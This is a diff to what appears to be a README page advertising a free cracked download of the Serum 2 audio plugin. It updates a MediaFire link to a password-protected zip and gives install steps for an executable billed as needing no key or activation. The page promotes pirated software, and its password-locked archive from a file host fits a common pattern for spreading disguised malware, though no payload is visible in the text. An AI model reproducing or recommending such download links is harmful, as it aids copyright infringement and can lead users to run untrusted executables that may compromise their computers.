@@ -1,6 +1,6 @@
 # Xfer SERUM 2 VST PlUGIN / Free Download link / Serum download
 ## Xfer Serum 2 vst, version 2.1.2 for your DAW. Simply installation, no key, no activation. New crack by V.R Team, includes only stock serum 2 with default presets.
-<a href="https://www.mediafire.com/folder/wneh4jo9eefjw/serum_2">Download here (password: serum)</a>
+<a href="https://www.mediafire.com/file/vsy3p0evtyztctu/Xfer+Records+-+Serum+2+v2.1.2.zip/file">Download here (password: serum)</a>
 ## Installation:
 1. Unzip Archive "Xfer Records - Serum 2 v2.1.2" (password: serum) in any folder
 2. Install "Install_Xfer_Serum2", its serum 2 without crack
